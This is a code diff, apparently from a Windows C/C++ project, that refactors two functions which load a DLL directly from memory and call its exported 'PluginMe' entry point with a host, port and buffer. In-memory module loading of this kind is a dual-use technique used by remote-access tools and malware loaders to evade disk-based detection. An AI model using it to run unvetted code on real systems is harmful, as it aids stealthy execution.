@@ -15,10 +15,7 @@ typedef BOOL(*PluginMeEx)(LPCSTR lpszHost, UINT nPort, LPBYTE lpBuffer, LPBYTE l
 #ifndef _DEBUG
 void LoadFromMemory(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
 {
-	HMEMORYMODULE HDll;
-	PluginMe myPluginMe;
-
-	HDll = MemoryLoadLibrary(data);
+	HMEMORYMODULE HDll = MemoryLoadLibrary(data);
 	if (HDll == NULL)
 	{
 		return;
@@ -27,7 +24,7 @@ void LoadFromMemory(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
 	CHAR lpHost[1024];
 	WideCharToMultiByte(CP_OEMCP, NULL, lpszHost, -1, lpHost, 1024, NULL, FALSE);
 
-	myPluginMe = (PluginMe)MemoryGetProcAddress(HDll, "PluginMe");
+	PluginMe myPluginMe = (PluginMe)MemoryGetProcAddress(HDll, "PluginMe");
 	myPluginMe(lpHost, nPort, lpBuffer);
 	MemoryFreeLibrary(HDll);
 
@@ -36,10 +33,7 @@ void LoadFromMemory(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
 
 void LoadFromMemoryEx(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer, LPBYTE lpFun1, LPBYTE lpFun2, DWORD flags)
 {
-	HMEMORYMODULE module;
-	PluginMeEx myPluginMeEx;
-
-	module = MemoryLoadLibrary(data);
+	HMEMORYMODULE module = MemoryLoadLibrary(data);
 	if (module == NULL)
 	{
 		return;
@@ -48,7 +42,7 @@ void LoadFromMemoryEx(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer
 	CHAR lpHost[1024];
 	WideCharToMultiByte(CP_OEMCP, NULL, lpszHost, -1, lpHost, 1024, NULL, FALSE);
 
-	myPluginMeEx = (PluginMeEx)MemoryGetProcAddress(module, "PluginMeEx");
+	PluginMeEx myPluginMeEx = (PluginMeEx)MemoryGetProcAddress(module, "PluginMeEx");
 	myPluginMeEx(lpHost, nPort, lpBuffer, lpFun1, lpFun2, flags);
 	MemoryFreeLibrary(module);
 
